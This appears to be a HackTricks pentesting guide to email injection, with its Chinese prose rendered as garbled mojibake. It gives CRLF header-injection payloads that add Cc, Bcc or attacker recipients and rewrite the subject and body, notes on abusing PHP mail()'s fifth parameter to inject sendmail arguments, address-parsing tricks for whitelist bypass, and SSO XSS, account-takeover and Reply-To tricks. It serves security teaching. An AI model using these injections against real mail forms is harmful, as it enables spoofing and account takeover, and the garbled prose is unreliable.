# Email Injections

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ä»Šå¤©è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## æ³¨å…¥å·²å‘é€çš„ç”µå­é‚®ä»¶

### åœ¨å‘ä»¶äººå‚æ•°åæ³¨å…¥ Cc å’Œ Bcc
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
æ¶ˆæ¯å°†è¢«å‘é€åˆ°æ”¶ä»¶äººå’Œæ”¶ä»¶äºº1è´¦æˆ·ã€‚

### æ³¨å…¥å‚æ•°
```
From:sender@domain.com%0ATo:attacker@domain.com
```
æ¶ˆæ¯å°†å‘é€åˆ°åŸå§‹æ”¶ä»¶äººå’Œæ”»å‡»è€…è´¦æˆ·ã€‚

### æ³¨å…¥ä¸»é¢˜å‚æ•°
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
å‡ä¸»é¢˜å°†è¢«æ·»åŠ åˆ°åŸå§‹ä¸»é¢˜ä¸­ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å°†æ›¿æ¢å®ƒã€‚è¿™å–å†³äºé‚®ä»¶æœåŠ¡çš„è¡Œä¸ºã€‚

### æ›´æ”¹æ¶ˆæ¯æ­£æ–‡

æ³¨å…¥ä¸€ä¸ªä¸¤è¡Œæ¢è¡Œç¬¦ï¼Œç„¶åå†™ä¸‹æ‚¨çš„æ¶ˆæ¯ä»¥æ›´æ”¹æ¶ˆæ¯çš„æ­£æ–‡ã€‚
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() å‡½æ•°åˆ©ç”¨
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### ç¬¬äº”ä¸ªå‚æ•° ($additional\_parameters)

æœ¬èŠ‚å°†åŸºäº**å‡è®¾æ”»å‡»è€…æ§åˆ¶æ­¤å‚æ•°çš„æƒ…å†µä¸‹å¦‚ä½•æ»¥ç”¨æ­¤å‚æ•°**ã€‚

æ­¤å‚æ•°å°†è¢«æ·»åŠ åˆ° PHP ç”¨äºè°ƒç”¨äºŒè¿›åˆ¶ sendmail çš„å‘½ä»¤è¡Œä¸­ã€‚ç„¶è€Œï¼Œå®ƒå°†é€šè¿‡å‡½æ•° `escapeshellcmd($additional_parameters)` è¿›è¡Œæ¸…ç†ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥**æ³¨å…¥ sendmail çš„æå–å‚æ•°**ã€‚

#### /usr/sbin/sendmail å®ç°çš„å·®å¼‚

**sendmail** æ¥å£æ˜¯ç”±å®‰è£…åœ¨ç³»ç»Ÿä¸Šçš„ **MTA é‚®ä»¶è½¯ä»¶**ï¼ˆSendmailã€Postfixã€Exim ç­‰ï¼‰æä¾›çš„ã€‚å°½ç®¡å‡ºäºå…¼å®¹æ€§åŸå› ï¼Œ**åŸºæœ¬åŠŸèƒ½**ï¼ˆå¦‚ -t -i -f å‚æ•°ï¼‰ä¿æŒ**ç›¸åŒ**ï¼Œä½†**å…¶ä»–åŠŸèƒ½å’Œå‚æ•°**æ ¹æ®å®‰è£…çš„ MTA æœ‰å¾ˆå¤§å·®å¼‚ã€‚

ä»¥ä¸‹æ˜¯ sendmail å‘½ä»¤/æ¥å£çš„ä¸åŒæ‰‹å†Œé¡µçš„ä¸€äº›ç¤ºä¾‹ï¼š

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

æ ¹æ® **sendmail** äºŒè¿›åˆ¶æ–‡ä»¶çš„æ¥æºï¼Œå‘ç°äº†ä¸åŒçš„é€‰é¡¹æ¥æ»¥ç”¨å®ƒä»¬å¹¶**æ³„éœ²æ–‡ä»¶æˆ–ç”šè‡³æ‰§è¡Œä»»æ„å‘½ä»¤**ã€‚è¯·æŸ¥çœ‹ [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## åœ¨ç”µå­é‚®ä»¶åç§°ä¸­æ³¨å…¥

### è¢«å¿½ç•¥çš„ç”µå­é‚®ä»¶éƒ¨åˆ†

ç¬¦å·ï¼š**+ã€-** å’Œ **{}** åœ¨å°‘æ•°æƒ…å†µä¸‹å¯ä»¥ç”¨äºæ ‡è®°ï¼Œå¹¶è¢«å¤§å¤šæ•°ç”µå­é‚®ä»¶æœåŠ¡å™¨å¿½ç•¥ã€‚

* ä¾‹å¦‚ï¼šjohn.doe+intigriti@example.com â†’ john.doe@example.com

**æ‹¬å· () ä¸­çš„æ³¨é‡Š**åœ¨å¼€å¤´æˆ–ç»“å°¾ä¹Ÿä¼šè¢«å¿½ç•¥ã€‚

* ä¾‹å¦‚ï¼šjohn.doe(intigriti)@example.com â†’ john.doe@example.com

### ç™½åå•ç»•è¿‡

<figure><img src="../.gitbook/assets/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### å¼•å·

<figure><img src="../.gitbook/assets/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IP

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨æ–¹æ‹¬å·ä¸­çš„ IP ä½œä¸ºåŸŸåï¼š

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### å…¶ä»–æ¼æ´

![https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](<../.gitbook/assets/image (1131).png>)

## ç¬¬ä¸‰æ–¹ SSO

### XSS

ä¸€äº›æœåŠ¡å¦‚ **github** æˆ– **salesforce å…è®¸**æ‚¨åˆ›å»ºå¸¦æœ‰ **XSS è´Ÿè½½çš„ç”µå­é‚®ä»¶åœ°å€**ã€‚å¦‚æœæ‚¨å¯ä»¥**ä½¿ç”¨è¿™äº›æä¾›å•†ç™»å½•å…¶ä»–æœåŠ¡**ï¼Œè€Œè¿™äº›æœåŠ¡**æ²¡æœ‰æ­£ç¡®æ¸…ç†**ç”µå­é‚®ä»¶ï¼Œæ‚¨å¯èƒ½ä¼šå¯¼è‡´ **XSS**ã€‚

### è´¦æˆ·æ¥ç®¡

å¦‚æœ **SSO æœåŠ¡** å…è®¸æ‚¨ **åˆ›å»ºä¸€ä¸ªä¸éªŒè¯ç»™å®šç”µå­é‚®ä»¶åœ°å€çš„è´¦æˆ·**ï¼ˆå¦‚ **salesforce**ï¼‰ï¼Œç„¶åæ‚¨å¯ä»¥ä½¿ç”¨è¯¥è´¦æˆ·åœ¨ **ä¿¡ä»»** salesforce çš„ä¸åŒæœåŠ¡ä¸­ **ç™»å½•**ï¼Œæ‚¨å¯èƒ½ä¼šè®¿é—®ä»»ä½•è´¦æˆ·ã€‚\
_è¯·æ³¨æ„ï¼Œsalesforce æŒ‡ç¤ºç»™å®šçš„ç”µå­é‚®ä»¶æ˜¯å¦ç»è¿‡éªŒè¯ï¼Œä½†åº”ç”¨ç¨‹åºä¹Ÿåº”è€ƒè™‘æ­¤ä¿¡æ¯ã€‚_

## å›å¤è‡³

æ‚¨å¯ä»¥ä½¿ç”¨ _**From: company.com**_ å’Œ _**Replay-To: attacker.com**_ å‘é€ç”µå­é‚®ä»¶ï¼Œå¦‚æœç”±äºç”µå­é‚®ä»¶æ˜¯ä» **å†…éƒ¨åœ°å€** å‘é€çš„è€Œå‘é€äº†ä»»ä½• **è‡ªåŠ¨å›å¤**ï¼Œåˆ™ **æ”»å‡»è€…** å¯èƒ½èƒ½å¤Ÿ **æ¥æ”¶**è¯¥ **å“åº”**ã€‚

## ç¡¬é€€ä¿¡ç‡

æŸäº›æœåŠ¡ï¼Œå¦‚ AWSï¼Œå®æ–½ä¸€ä¸ªç§°ä¸º **ç¡¬é€€ä¿¡ç‡** çš„é˜ˆå€¼ï¼Œé€šå¸¸è®¾ç½®ä¸º 10%ã€‚è¿™æ˜¯ä¸€ä¸ªå…³é”®æŒ‡æ ‡ï¼Œå°¤å…¶å¯¹äºç”µå­é‚®ä»¶æŠ•é€’æœåŠ¡ã€‚å½“æ­¤æ¯”ç‡è¶…è¿‡æ—¶ï¼ŒæœåŠ¡ï¼ˆå¦‚ AWS çš„ç”µå­é‚®ä»¶æœåŠ¡ï¼‰å¯èƒ½ä¼šè¢«æš‚åœæˆ–é˜»æ­¢ã€‚

**ç¡¬é€€ä¿¡** æ˜¯æŒ‡ç”±äºæ”¶ä»¶äººåœ°å€æ— æ•ˆæˆ–ä¸å­˜åœ¨è€Œè¢«é€€å›ç»™å‘ä»¶äººçš„ **ç”µå­é‚®ä»¶**ã€‚è¿™å¯èƒ½ç”±äºå¤šç§åŸå› å‘ç”Ÿï¼Œä¾‹å¦‚ **ç”µå­é‚®ä»¶** å‘é€åˆ°ä¸å­˜åœ¨çš„åœ°å€ã€ä¸€ä¸ªä¸çœŸå®çš„åŸŸåï¼Œæˆ–æ”¶ä»¶äººæœåŠ¡å™¨æ‹’ç»æ¥å— **ç”µå­é‚®ä»¶**ã€‚

åœ¨ AWS çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå¦‚æœæ‚¨å‘é€ 1000 å°ç”µå­é‚®ä»¶ï¼Œå…¶ä¸­ 100 å°å¯¼è‡´ç¡¬é€€ä¿¡ï¼ˆç”±äºæ— æ•ˆåœ°å€æˆ–åŸŸåç­‰åŸå› ï¼‰ï¼Œè¿™å°†æ„å‘³ç€ 10% çš„ç¡¬é€€ä¿¡ç‡ã€‚è¾¾åˆ°æˆ–è¶…è¿‡æ­¤æ¯”ç‡å¯èƒ½ä¼šè§¦å‘ AWS SESï¼ˆç®€å•ç”µå­é‚®ä»¶æœåŠ¡ï¼‰é˜»æ­¢æˆ–æš‚åœæ‚¨çš„ç”µå­é‚®ä»¶å‘é€èƒ½åŠ›ã€‚

ä¿æŒä½ç¡¬é€€ä¿¡ç‡å¯¹äºç¡®ä¿ä¸é—´æ–­çš„ç”µå­é‚®ä»¶æœåŠ¡å’Œç»´æŠ¤å‘ä»¶äººå£°èª‰è‡³å…³é‡è¦ã€‚ç›‘æ§å’Œç®¡ç†æ‚¨çš„é‚®ä»¶åˆ—è¡¨ä¸­ç”µå­é‚®ä»¶åœ°å€çš„è´¨é‡å¯ä»¥æ˜¾è‘—å¸®åŠ©å®ç°è¿™ä¸€ç›®æ ‡ã€‚

æœ‰å…³æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒ AWS å…³äºå¤„ç†é€€ä¿¡å’ŒæŠ•è¯‰çš„å®˜æ–¹æ–‡æ¡£ [AWS SES é€€ä¿¡å¤„ç†](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types)ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}
